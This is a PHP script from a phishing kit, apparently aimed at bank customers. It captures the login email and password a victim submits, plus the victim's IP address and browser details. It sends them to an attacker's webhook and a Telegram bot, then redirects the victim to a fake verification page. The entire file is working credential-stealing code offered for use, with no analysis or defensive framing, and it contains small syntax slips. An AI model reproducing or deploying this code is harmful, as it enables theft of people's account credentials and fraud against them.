<?php
/*

 __,  ,_    _    ,  ,  ,  ,  ,    ___, ,  ,
'|_,  |_)  '|\   |\ |  |_/   |   ' |   |\ |
 |   '| \   |-\  |'\| '| \  '|__  _|_, |'\|
 '    '  `  '  ` '  `  '  `    ' '     '  `

*/
session_start();
$ip = getenv("REMOTE_ADDR");
$agnet = $_SERVER['HTTP_USER_AGENT'];
require '../main.php';
require '../config/settings.php';
// Copyright - Franklin.

If ($_POST['login_email'] == "") {
  echo "Sorry we blocked your request";
  exit;

}

If ($_POST['login_password'] == "") {
  echo "Sorry we blocked your request";
  exit;
}



$message .= "⭐ ---------- Login Information ---------- ⭐\n";
$message .= "| User Email: " . $_POST['login_email'] . "\n";
$message .= "| User Password: " . $_POST['login_password'] . "\n";
$message .= "⭐------- Device Information -------⭐\n";
$message .= "| IP Address: " . $ip . "\n";
$message .= "| OS/Browser: " . $os . "/" . $br . "\n";
$message .= "| Date: " . $date . "\n";
$message .= "| Agnet: " . $agnet . "\n";
$message .= "⭐ ---------- To Be Continued ---------- ⭐\n";
$headers = 'From: Franklin <franklin@chase.sell>' . "\r\n" .

$url = "" . $webhook . "";
$headers = ['Content-Type: application/json; charset=utf-8'];
$POST = ['username' => 'Quartz', 'content' => $message];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);

$apiUrl = "https://api.telegram.org/bot$http_api/sendMessage";
$params = ['chat_id' => $chat_id, 'text' => $message];
$queryString = http_build_query($params);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$apiUrl?$queryString");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);


// Sessions //

$_SESSION['login_email'] = $login_email = $_POST['login_email'];
$_SESSION['login_password'] = $login_password = $_POST['login_password'];



header('location: ../getting-verified?token='.$key);
?>

?>
